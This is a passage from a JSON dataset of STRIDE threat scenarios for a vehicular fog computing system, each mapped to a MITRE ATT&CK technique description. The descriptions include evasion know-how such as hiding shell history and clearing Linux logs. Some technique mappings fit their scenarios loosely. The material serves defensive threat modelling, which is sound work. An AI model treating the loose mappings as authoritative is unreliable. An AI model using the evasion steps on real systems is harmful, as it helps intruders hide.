                {
                    "Assumption": "Cloud services have exploitable vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Valid if cloud systems are unpatched or misconfigured."
                },
                {
                    "Assumption": "No robust role-based access controls in place.",
                    "Role": "Cloud Service",
                    "Condition": "Valid if access controls are insufficient."
                },
                {
                    "Assumption": "User privileges are inadequately enforced.",
                    "Role": "System",
                    "Condition": "Valid if privilege enforcement mechanisms are weak."
                }
            ],
            "Potential Impact": "Critical VFC data could be accessed, altered, or destroyed, impacting overall service integrity.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "unauthorized access",
                "cloud services",
                "data compromise"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        }
    ]
},
{
    "case_number": "11",
    "batch_number": "15",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs a smart vehicle to send false data to the VFC system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to a vehicle or can mimic its signals.",
                    "Role": "Attacker",
                    "Condition": "The vehicle's communications protocols are not sufficiently robust against impersonation."
                },
                {
                    "Assumption": "The VFC system does not have strong authentication for vehicle identities.",
                    "Role": "VFC System",
                    "Condition": "Authentication methods are weak or non-existent."
                }
            ],
            "Potential Impact": "Unauthorized data entry leading to misinformation and potential traffic disruptions.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "vehicle",
                "identity"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs a fog node to intercept and manipulate data flow.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can physically or remotely access fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Physical security or network security of fog nodes is weak."
                },
                {
                    "Assumption": "Fog nodes do not securely authenticate each other before data exchange.",
                    "Role": "Fog Node",
                    "Condition": "Authentication protocols are insufficient."
                }
            ],
            "Potential Impact": "Data manipulation and privacy breach, leading to incorrect processing and decision-making.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "fog node",
                "data manipulation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses fake RSUs to redirect vehicle data to malicious endpoints.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can deploy counterfeit RSUs along the road infrastructure.",
                    "Role": "Attacker",
                    "Condition": "Lack of monitoring and validation of deployed RSUs."
                },
                {
                    "Assumption": "Vehicles recognize signals from any RSU without strong verification.",
                    "Role": "Smart Vehicle",
                    "Condition": "Insufficient validation mechanisms in vehicles for RSU signals."
                }
            ],
            "Potential Impact": "Data interception and potential modification, exacerbating privacy and integrity issues.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "RSU",
                "network",
                "data interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker corrupts the data stored on fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can gain access to the storage system of the fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Insufficient physical or network security controls on fog nodes' storage."
                },
                {
                    "Assumption": "Fog nodes do not employ strong data encryption and integrity checks.",
                    "Role": "VFC System",
                    "Condition": "Lack of robust encryption and integrity verification mechanisms."
                }
            ],
            "Potential Impact": "Data integrity compromised, leading to faulty decision-making and potentially hazardous situations on the road.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data corruption",
                "fog node",
                "storage"
            ],
            "mitre_technique": {
                "name": "Taint Shared Content",
                "description": "\nAdversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.\n\nA directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses [Shortcut Modification](https://attack.mitre.org/techniques/T1547/009) of directory .LNK files that use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like the real directories, which are hidden through [Hidden Files and Directories](https://attack.mitre.org/techniques/T1564/001). The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. (Citation: Retwin Directory Share Pivot)\n\nAdversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.",
                "id": "attack-pattern--246fd3c7-f5e3-466d-8787-4c13d9e3b61c",
                "technique_id": "T1080"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malware injected into cloud services to alter big data analytics results.",
            "Assumptions": [
                {
                    "Assumption": "The cloud service is accessible via the internet and has exploitable vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Vulnerabilities in the cloud service remain unpatched."
                },
                {
                    "Assumption": "The attacker can successfully deploy malware without being detected.",
                    "Role": "Attacker",
                    "Condition": "Insufficient monitoring and anomaly detection mechanisms."
                }
            ],
            "Potential Impact": "Analytics data integrity compromised, leading to erroneous predictive maintenance and traffic optimization decisions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "cloud",
                "malware",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Indicator Removal from Tools",
                "description": "If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use [Software Packing](https://attack.mitre.org/techniques/T1045) or otherwise modify the file so it has a different signature, and then re-use the malware.",
                "id": "attack-pattern--00d0b012-8a03-410e-95de-5826bf542de6",
                "technique_id": "T1066"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains unauthorized access to RSUs and alters traffic light scheduling data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can physically or remotely access RSUs.",
                    "Role": "Attacker",
                    "Condition": "RSUs are not adequately secured against unauthorized access."
                },
                {
                    "Assumption": "RSUs lack robust authentication mechanisms.",
                    "Role": "RSU",
                    "Condition": "Insufficient security protocols for RSU data handling."
                }
            ],
            "Potential Impact": "Compromised traffic flow management, leading to traffic congestion and potential accidents.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "RSU",
                "traffic light",
                "data manipulation"
            ],
            "mitre_technique": {
                "name": "Transmitted Data Manipulation",
                "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--cc1e737c-236c-4e3b-83ba-32039a626ef8",
                "technique_id": "T1493"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having sent a specific command to a smart vehicle or fog node.",
            "Assumptions": [
                {
                    "Assumption": "The system does not log all commands with associated user identities.",
                    "Role": "VFC System",
                    "Condition": "Logging and attribution mechanisms are weak or absent."
                },
                {
                    "Assumption": "Commands can be sent without strong non-repudiation measures.",
                    "Role": "Smart Vehicle/Fog Node",
                    "Condition": "Non-repudiation policies are not enforced."
                }
            ],
            "Potential Impact": "Disputes over command origin could lead to operational delays and inefficiencies.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "command",
                "logging",
                "accountability"
            ],
            "mitre_technique": {
                "name": "HISTCONTROL",
                "description": "The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands.",
                "id": "attack-pattern--086952c4-5b90-4185-b573-02bad8e11953",
                "technique_id": "T1148"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies responsibility for malicious data sent through fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "There are insufficient logs to track data source to end-users.",
                    "Role": "VFC System",
                    "Condition": "Inadequate data attribution and logging."
                },
                {
                    "Assumption": "Access control and user accountability mechanisms are weak.",
                    "Role": "Fog Node",
                    "Condition": "Absent or weak access control policies."
                }
            ],
            "Potential Impact": "Difficulty in pinpointing the origin of malicious data, hindering incident response and accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "malicious data",
                "logging",
                "access control"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A cloud service user denies having altered critical data used for analytics.",
            "Assumptions": [
                {
                    "Assumption": "User actions within the cloud services are not thoroughly logged.",
                    "Role": "VFC System",
                    "Condition": "Logging mechanisms do not capture all user activities."
                },
                {
                    "Assumption": "Data alteration activities lack non-repudiation measures.",
                    "Role": "Cloud Service User",
                    "Condition": "Non-repudiation policies are weak or non-existent."
                }
            ],
            "Potential Impact": "Challenge in tracking changes back to specific users, complicating forensic analysis and corrective actions.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "cloud",
                "data alteration",
                "logging"
            ],
            "mitre_technique": {
                "name": "Revert Cloud Instance",
                "description": "An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.\n\nAnother variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot)",
                "id": "attack-pattern--0708ae90-d0eb-4938-9a76-d0fc94f6eec1",
                "technique_id": "T1578.004"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker eavesdrops on the communication between smart vehicles and fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Communications are not encrypted.",
                    "Role": "VFC System",
                    "Condition": "Use of unencrypted communication channels."
                },
                {
                    "Assumption": "The attacker has the capability to intercept network traffic.",
                    "Role": "Attacker",
                    "Condition": "Positioned within the network or having the tools to intercept traffic."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive vehicle data, leading to privacy breaches and potentially tracking of vehicles.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "eavesdropping",
                "network traffic",
                "unprotected communication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data is exposed due to security misconfigurations in cloud storage.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage settings are not securely configured.",
                    "Role": "Cloud Administrator",
                    "Condition": "Misconfigurations in access control and security settings."
                },
                {
                    "Assumption": "Sensitive data is stored without encryption.",
                    "Role": "Cloud Service",
                    "Condition": "Absence of encryption policies for stored data."
                }
            ],
            "Potential Impact": "Exposure of critical data, leading to significant privacy and security risks.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud storage",
                "misconfiguration",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Data intercepted during fog-cloud data flows due to insecure transmission.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission between fog nodes and cloud services is not encrypted.",
                    "Role": "VFC System",
                    "Condition": "Lack of secure communication protocols."
                },
                {
                    "Assumption": "The attacker can intercept data along the transmission path.",
                    "Role": "Attacker",
                    "Condition": "Access to network path or tools for data interception."
                }
            ],
            "Potential Impact": "Sensitive data leakage, impacting both privacy and security of the information being transmitted.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "fog node",
                "cloud service",
                "data transmission"
            ],
            "mitre_technique": {
                "name": "Network Address Translation Traversal",
                "description": "Adversaries may bridge network boundaries by modifying a network device\u2019s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nNetwork devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device.  A typical example of this is environments where internal networks make use of non-Internet routable addresses.(Citation: RFC1918)\n\nWhen an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design.  In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.  In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders.  \n\nAdversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities",
                "id": "attack-pattern--4ffc1794-ec3b-45be-9e52-42dbcb2af2de",
                "technique_id": "T1599.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker initiates a DoS attack on fog nodes, rendering them non-functional.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes are exposed to the internet without adequate protection.",
                    "Role": "VFC System",
                    "Condition": "Lack of network and perimeter security."
                },
                {
                    "Assumption": "The attacker has the capability and resources to flood fog nodes with traffic.",
                    "Role": "Attacker",
                    "Condition": "Adequate resources and tools for launching DoS attacks."
                }
            ],
            "Potential Impact": "Disruption in local processing and decision-making, leading to potential traffic management failures.",
            "MITRE ATT&CK Keywords": [
                "DoS",
                "fog node",
                "network traffic",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets the cloud services with a DDoS attack, causing service disruption.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services are publicly accessible and not sufficiently protected.",
                    "Role": "VFC System",
                    "Condition": "Inadequate defense mechanisms against DDoS."
                },
                {
                    "Assumption": "The attacker can mobilize a large botnet for the DDoS attack.",
                    "Role": "Attacker",
                    "Condition": "Access to vast resources for sustained DDoS attacks."
                }
            ],
            "Potential Impact": "Disruption in data storage and analytics, leading to halted operations and potential data loss.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "cloud services",
                "botnet",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Smart vehicles are overwhelmed with malicious data packets, leading to system crashes.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels are not monitored for abnormal traffic patterns.",
                    "Role": "VFC System",
                    "Condition": "Lack of intrusion detection or prevention systems."
                },
                {
                    "Assumption": "The vehicle\u2019s onboard systems can be overwhelmed without protective countermeasures.",
                    "Role": "Smart Vehicle",
                    "Condition": "Absence of rate-limiting and other protective mechanisms."
                }
            ],
            "Potential Impact": "Operational disruptions and potential safety hazards due to vehicle system crashes.",
            "MITRE ATT&CK Keywords": [
                "DoS",
                "smart vehicle",
                "malicious data",
                "crash"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
